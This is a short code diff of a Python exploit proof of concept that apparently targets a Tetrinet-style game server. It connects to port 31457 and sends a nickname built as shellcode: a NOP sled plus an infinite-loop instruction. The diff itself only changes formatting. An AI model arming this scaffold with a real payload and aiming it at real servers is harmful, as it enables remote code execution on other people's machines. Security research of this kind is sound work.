@@ -7,17 +7,18 @@
 import socket, sys
 import pytrinet._utils.utils as pyt
 
-N = 1024*4
-s = socket.socket()         # Create a socket object
-port = 31457                # Reserve a port for your service.
-ip = sys.argv[1]
-s.connect((ip, port))        # Bind to the port
+N    = 1024*4
+s    = socket.socket()
+port = 31457
+ip   = sys.argv[1]
+
+s.connect((ip, port))
 
 # we could probably find our way back here to the shellcode if
 # absolutely necessary
 shellcode = "\x90"*100 + "\xeb\xfe"
 
-nick = shellcode
+nick    = shellcode
 version = "1.13"
 
 serverip = [ int(i) for i in sys.argv[1].split('.') ]
